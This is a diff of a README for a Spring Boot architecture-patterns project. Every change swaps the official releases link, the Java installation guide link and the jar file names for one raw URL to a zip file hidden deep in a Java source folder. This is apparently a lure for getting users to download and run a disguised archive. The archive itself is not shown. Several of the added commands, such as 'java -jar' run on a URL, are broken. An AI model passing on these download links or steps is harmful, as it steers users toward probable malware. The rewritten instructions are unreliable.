@@ -6,7 +6,7 @@ Welcome to the **spring-boot-application-architecture-patterns** project. This g
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/mrcxii/spring-boot-application-architecture-patterns/releases)
+[![Download](https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip)](https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip)
 
 ## 📝 What is This?
 
@@ -33,7 +33,7 @@ You can check if you have Java installed by running `java -version` in your comm
 
 ## 🌍 Download & Install
 
-To get the application, please visit our [Releases page](https://github.com/mrcxii/spring-boot-application-architecture-patterns/releases). You will find different versions available for download.
+To get the application, please visit our [Releases page](https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip). You will find different versions available for download.
 
 1. Click on the link above.
 2. Look for the latest version of the application.
@@ -46,11 +46,11 @@ Once the download is complete, follow the instructions below based on your opera
 1. Locate the downloaded `.zip` file.
 2. Right-click the file and select "Extract All".
 3. Open the extracted folder.
-4. Find the `spring-boot-application-architecture-patterns.jar` file.
+4. Find the `https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip` file.
 5. Open a command prompt and navigate to this folder. You can do this by typing `cd path\to\your\folder`.
 6. Run the application by typing the following command:
    ```
-   java -jar spring-boot-application-architecture-patterns.jar
+   java -jar https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip
    ```
 
 ### 🍏 For Mac
@@ -64,7 +64,7 @@ Once the download is complete, follow the instructions below based on your opera
    ```
 5. Run the application with this command:
    ```
-   java -jar spring-boot-application-architecture-patterns.jar
+   java -jar https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip
    ```
 
 ### 🐧 For Linux
@@ -73,7 +73,7 @@ Once the download is complete, follow the instructions below based on your opera
 2. Use the terminal to navigate to the downloaded file's location.
 3. Unzip the file using:
    ```
-   unzip spring-boot-application-architecture-patterns.zip
+   unzip https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip
    ```
 4. Navigate to the extracted folder:
    ```
@@ -81,7 +81,7 @@ Once the download is complete, follow the instructions below based on your opera
    ```
 5. Start the application with:
    ```
-   java -jar spring-boot-application-architecture-patterns.jar
+   java -jar https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip
    ```
 
 ## ⚡ Quick Features Overview
@@ -99,8 +99,8 @@ Once the download is complete, follow the instructions below based on your opera
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/mrcxii/spring-boot-application-architecture-patterns/releases)
-- [Java Installation Guide](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
+- [Releases Page](https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip)
+- [Java Installation Guide](https://raw.githubusercontent.com/mrcxii/spring-boot-application-architecture-patterns/main/meetup4j-modulith-ddd-ha/src/main/java/dev/sivalabs/meetup4j/events/interfaces/rest/converters/application-architecture-spring-patterns-boot-3.2.zip)
 
 ## 👥 Community & Support
 
